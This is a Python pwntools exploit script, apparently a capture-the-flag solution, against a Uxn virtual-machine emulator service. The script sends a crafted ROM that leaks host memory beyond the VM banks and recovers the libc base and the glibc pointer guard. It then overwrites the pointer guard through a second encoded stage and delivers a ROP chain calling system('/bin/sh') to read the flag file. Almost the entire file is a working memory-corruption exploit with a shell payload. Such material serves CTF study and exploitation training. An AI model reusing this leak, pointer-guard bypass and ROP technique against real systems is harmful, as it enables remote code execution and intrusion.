#!/usr/bin/env python3
import argparse
import base64
import pathlib
import re
import sys
import time

from pwn import ELF, ROP, context, p16, p64, remote, u64


HERE = pathlib.Path(__file__).resolve().parent


def bundled_file(name):
    for path in (HERE / name, HERE.parent / "public" / name, pathlib.Path(name)):
        if path.is_file():
            return path
    raise FileNotFoundError(name)


context.arch = "amd64"
context.log_level = "error"
libc = ELF(str(bundled_file("libc.so.6")), checksec=False)

LEAK_ADDR = 0x4000
LEAK_LEN = 0x3000
STAGE = 0x1000
STAGE_SIZE = 0x4000

SNAPSHOT = 0x3820
RESTORE = 0x3840
TLS_COPY = 0x8000
POINTER_GUARD = 0x2760


class Uxn:
    def __init__(self, origin):
        self.origin = origin
        self.code = bytearray()
        self.labels = {}
        self.fixups = []

    def byte(self, *values):
        self.code.extend(values)

    def lit(self, value):
        value &= 0xFF
        if value == 0xFF:
            self.byte(0x80, 0, 0x80, 1, 0x19)
        else:
            self.byte(0x80, value)

    def lit2(self, value):
        value &= 0xFFFF
        if 0xFF in (value >> 8, value & 0xFF):
            self.lit(value >> 8)
            self.lit(value)
        else:
            self.byte(0xA0, value >> 8, value & 0xFF)

    def label(self, name):
        self.labels[name] = len(self.code)

    def branch(self, opcode, label):
        self.byte(opcode, 0, 0)
        self.fixups.append((len(self.code) - 2, label))

    def finish(self):
        for at, label in self.fixups:
            offset = (self.labels[label] - at - 2) & 0xFFFF
            self.code[at : at + 2] = p16(offset, endian="big")
        return bytes(self.code)


def sta(uxn, address, value):
    uxn.lit(value)
    uxn.lit2(address)
    uxn.byte(0x15)


def deo2(uxn, port, value):
    uxn.lit2(value)
    uxn.lit(port)
    uxn.byte(0x37)


def place(blob, address, data, origin):
    offset = address - origin
    blob[offset : offset + len(data)] = data


def expansion(command, length, src_bank, src_addr, dst_bank, dst_addr):
    return (
        bytes([command])
        + p16(length, endian="big")
        + p16(src_bank, endian="big")
        + p16(src_addr, endian="big")
        + p16(dst_bank, endian="big")
        + p16(dst_addr, endian="big")
    )


def write_bytes(uxn, address, data):
    for offset, value in enumerate(data):
        sta(uxn, address + offset, value)


def stage1():
    uxn = Uxn(0x100)
    descriptor = 0x900
    counter = 0xA00
    key = counter + 2

    # Leak the memory immediately after the final VM bank.
    deo2(uxn, 0x02, descriptor)
    uxn.lit2(LEAK_ADDR)
    uxn.lit2(counter)
    uxn.byte(0x35)
    uxn.label("print")
    uxn.lit2(counter)
    uxn.byte(0x34, 0x26, 0x14)
    uxn.lit(0x19)
    uxn.byte(0x17, 0x21, 0x26)
    uxn.lit2(counter)
    uxn.byte(0x35)
    uxn.lit2(LEAK_ADDR + LEAK_LEN)
    uxn.byte(0x28)
    uxn.branch(0x20, "printed")
    uxn.branch(0x40, "print")
    uxn.label("printed")

    uxn.lit2(0)
    uxn.lit2(counter)
    uxn.byte(0x35)
    loader_vector_at = len(uxn.code)
    deo2(uxn, 0x10, 0)
    uxn.byte(0)

    # The first console byte is an XOR key; the rest is decoded into VM RAM.
    uxn.label("loader")
    uxn.lit2(key)
    uxn.byte(0x14)
    uxn.branch(0x20, "decode")
    uxn.lit(0x12)
    uxn.byte(0x16)
    uxn.lit2(key)
    uxn.byte(0x15, 0)
    uxn.label("decode")
    uxn.lit(0x12)
    uxn.byte(0x16)
    uxn.lit2(key)
    uxn.byte(0x14, 0x1E)
    uxn.lit2(counter)
    uxn.byte(0x34)
    uxn.lit2(STAGE)
    uxn.byte(0x38, 0x15)
    uxn.lit2(counter)
    uxn.byte(0x34, 0x21, 0x26)
    uxn.lit2(counter)
    uxn.byte(0x35)

    uxn.lit2(STAGE_SIZE)
    uxn.byte(0x28)
    uxn.branch(0x20, "loaded")
    uxn.byte(0)

    # The following native read carries the ROP chain in coninp on the stack.
    uxn.label("loaded")
    carrier_vector_at = len(uxn.code)
    deo2(uxn, 0x10, 0)
    uxn.byte(0)
    uxn.label("carrier")
    deo2(uxn, 0x10, 0)
    uxn.lit2(STAGE)
    uxn.byte(0x2C)

    code = bytearray(uxn.finish())
    loader_vector = uxn.origin + uxn.labels["loader"]
    code[loader_vector_at + 1 : loader_vector_at + 3] = p16(
        loader_vector, endian="big"
    )
    carrier_vector = uxn.origin + uxn.labels["carrier"]
    code[carrier_vector_at + 1 : carrier_vector_at + 3] = p16(
        carrier_vector, endian="big"
    )

    rom = bytearray(descriptor + 11 - uxn.origin)
    place(rom, uxn.origin, code, uxn.origin)
    place(
        rom,
        descriptor,
        expansion(1, LEAK_LEN, 15, 0xF000, 0, LEAK_ADDR),
        uxn.origin,
    )
    return bytes(rom)


def stage2(pivot, old_guard, dl_fini):
    uxn = Uxn(STAGE)

    # Preserve the leaked region, alter only the pointer guard, then restore it.
    deo2(uxn, 0x02, SNAPSHOT)
    write_bytes(uxn, TLS_COPY + POINTER_GUARD, p64(old_guard ^ dl_fini ^ pivot))
    deo2(uxn, 0x02, RESTORE)
    uxn.lit(0x80)
    uxn.lit(0x0F)
    uxn.byte(0x17, 0)

    result = bytearray(STAGE_SIZE)
    place(result, STAGE, uxn.finish(), STAGE)
    place(
        result,
        SNAPSHOT,
        expansion(1, 0x2800, 15, 0xF000, 0, TLS_COPY),
        STAGE,
    )
    place(
        result,
        RESTORE,
        expansion(1, POINTER_GUARD + 8, 0, TLS_COPY, 15, 0xF000),
        STAGE,
    )
    return bytes(result)


def encode_stage(data):
    # 0xff is interpreted as EOF by console_input(), so avoid it on the wire.
    for key in range(1, 0xFF):
        encoded = bytes(value ^ key for value in data)
        if b"\xff" not in encoded:
            return bytes([key]) + encoded
    raise ValueError("no byte-safe stage encoding")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    parser.add_argument("--ssl", action="store_true")
    args = parser.parse_args()

    connection = {"ssl": True, "sni": args.host} if args.ssl else {}
    io = remote(args.host, args.port, **connection)
    io.sendlineafter(b"ROM (base64): ", base64.b64encode(stage1()))

    leak = io.recvn(LEAK_LEN, timeout=10)
    if len(leak) != LEAK_LEN:
        raise RuntimeError("short memory leak")

    libc.address = u64(leak[0x26A8:0x26B0]) - libc.sym["_res"]
    old_guard = u64(leak[POINTER_GUARD : POINTER_GUARD + 8])
    dl_fini = u64(leak[0x29F0:0x29F8]) - 0x3B0D8 + 0x6040

    rop = ROP(libc)
    pivot = rop.find_gadget(["add rsp, 8", "ret"])
    if pivot is None:
        raise RuntimeError("required stack adjustment gadget is missing")
    rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh\0"))])

    io.send(encode_stage(stage2(pivot.address, old_guard, dl_fini)))

    # Wait until stage two owns the console vector, then fill one native read.
    time.sleep(0.5)
    carrier = (b"\0" * 0xE0 + rop.chain()).ljust(0xFF, b"\0")
    if len(carrier) != 0xFF:
        raise RuntimeError("ROP chain does not fit in the console buffer")
    io.send(carrier)

    io.sendline(b"cat /flag; exit")
    output = io.recvall(timeout=8)
    match = re.search(rb"ECSC\{[^}\n]+\}", output)
    if match is None:
        sys.stderr.buffer.write(output)
        raise RuntimeError("flag not found in process output")
    print(match.group().decode())


if __name__ == "__main__":
    main()
